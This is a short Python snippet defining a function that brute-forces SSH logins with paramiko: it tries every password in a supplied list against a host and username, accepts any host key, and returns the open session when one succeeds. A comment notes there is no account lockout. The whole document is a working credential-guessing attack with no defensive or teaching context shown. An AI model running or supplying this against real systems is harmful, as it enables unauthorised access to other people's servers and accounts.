def ssh_brute_force(host, username, password_list):
    # No account lockout
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password)
            return ssh
        except paramiko.AuthenticationException:
            continue
    return None